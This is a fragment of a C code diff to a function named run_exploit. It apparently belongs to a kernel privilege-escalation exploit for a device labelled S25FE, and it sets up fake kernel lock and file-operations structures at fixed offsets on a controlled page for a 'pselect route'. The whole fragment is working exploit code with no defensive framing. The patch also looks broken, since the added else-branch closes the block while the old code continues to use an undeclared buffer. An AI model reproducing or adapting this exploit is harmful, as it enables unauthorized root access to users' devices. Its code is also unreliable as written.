@@ -464,7 +464,7 @@ int run_exploit(int argc, char **argv) {
     }
   }
   
-  /* S25FE: reuse slide page but initialize fake structures via configfs */
+  /* S25FE: set up fake structure addresses for pselect route */
   if (page_base) {
     fake_lock = page_base + LOCK_OFF;
     fake_w0 = page_base + W0_OFF;
@@ -475,10 +475,12 @@ int run_exploit(int argc, char **argv) {
     fake_left = 0;
     binwrite_target = page_base + SCRATCH_OFF;
 
-    int fd = open_ashmem_device();
-    if (fd >= 0) {
-      unsigned char p[ORDER3_SIZE];
-      memset(p, 0, sizeof(p));
+    pr_info("S25FE: fake page ready base=%016zx lock=%016zx fops=%016zx\n",
+            page_base, fake_lock, fake_fops);
+  } else {
+    pr_error("S25FE: no page available\n");
+    return 1;
+  }
 
       /* Lock structure */
       put32(p, LOCK_OFF + 0x00, 0);
